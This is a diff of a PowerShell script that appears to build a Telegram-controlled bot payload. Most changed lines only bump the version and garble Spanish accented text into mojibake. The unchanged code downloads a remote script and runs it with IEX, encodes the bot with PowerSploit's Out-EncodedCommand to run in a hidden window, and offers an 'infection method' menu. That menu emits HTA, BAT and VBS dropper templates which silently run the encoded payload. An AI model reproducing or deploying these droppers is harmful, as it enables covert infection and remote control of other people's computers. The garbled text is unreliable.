@@ -1,6 +1,6 @@
 clear
 $ErrorActionPreference = "SilentlyContinue"
-$version = "0.3"
+$version = "0.5"
 
 $banner = "    ____  _____ ____      ______     __                              
    / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
@@ -57,7 +57,7 @@ Function check-command
 
 ################################### Comprobamos si existe el cmdlet Ivoke-WebRequest y en el caso de que no exista lo cargamos ######################################
 
-if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃ³n Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
+if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃƒÂ³n Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
 $out_encoded_load_castellano = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funcion Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline '
 $out_encoded_load_english = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funcion Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline '
 if ($idioma -eq "English") {IEX $out_encoded_load_english} ; if ($idioma -eq "Spanish") {IEX $out_encoded_load_castellano}
@@ -92,7 +92,7 @@ $code = Out-EncodedCommand -Path bot.ps1 -NoProfile -NonInteractive -WindowStyle
 
 ######################################################## Tipos de Archivos #######################################################################
 
-$tu_codigo = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu código es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1'
+$tu_codigo = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu cÃ³digo es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1'
 $your_code =  'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Your code is: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1'
 $plantilla_hta = "<html><head><script>var c= '$code'new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>" 
 $plantilla_bat = '@echo off
@@ -122,7 +122,7 @@ command = "' + $code + '"
 objShell.Run command,0
 Set objShell = Nothing'
 $plantilla_macro = "Cooming soon"
-############################################################### Función Expotar code a archivo ###############################################################
+############################################################### FunciÃ³n Expotar code a archivo ###############################################################
 
 
 
@@ -131,7 +131,7 @@ do
 { 
   
 
-    Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] ¿ Quieres exportar a un archivo ? (S/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
+    Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Â¿ Quieres exportar a un archivo ? (S/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
          switch ($input) 
      {    'S' { Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Escriba la ruta para expotar el archivo : " -ForegroundColor Green -NoNewline ; $Salida = Read-Host
         $salida = (ls $salida).DirectoryName[0] ; $Salida = $salida + "\OutFile" ; if ((Test-Path $Salida) -eq $false) {mkdir $Salida | Out-Null ; $salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} else {$salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida; 
@@ -160,7 +160,7 @@ do
 } 
 until ($input -eq "Y" -or $input -eq "N")}
 
-############################################################### Menú de infección Ingles ###############################################################
+############################################################### MenÃº de infecciÃ³n Ingles ###############################################################
 
 if ($idioma -eq "English"){
 do 
@@ -190,19 +190,19 @@ until ($input -eq 1 -or $input -eq 2 -or $input -eq 3 -or $input -eq 4 -or $inpu
 }
 
 
-############################################################### Menú de infección Castellano ###############################################################
+############################################################### MenÃº de infecciÃ³n Castellano ###############################################################
 
 if ($idioma -eq "Spanish"){
 do 
 { 
-     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Metodo de infección`n" -ForegroundColor Green -NoNewline
+     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Metodo de infecciÃ³n`n" -ForegroundColor Green -NoNewline
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "1" -ForegroundColor Red -NoNewline ; Write-Host "] ShellCode" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "2" -ForegroundColor Red -NoNewline ; Write-Host "] BAT" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "3" -ForegroundColor Red -NoNewline ; Write-Host "] HTA" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "4" -ForegroundColor Red -NoNewline ; Write-Host "] SCT" -ForegroundColor Green -NoNewline
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "5" -ForegroundColor Red -NoNewline ; Write-Host "] VBS" -ForegroundColor Green -NoNewline
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "6" -ForegroundColor Red -NoNewline ; Write-Host "] MACRO" -ForegroundColor Green -NoNewline    
-     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Seleccione opción : " -ForegroundColor Green -NoNewline ; $input = Read-Host
+     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Seleccione opciÃ³n : " -ForegroundColor Green -NoNewline ; $input = Read-Host
      switch ($input) 
      { 
             '1' { IEX $tu_codigo ; Write-Host $code
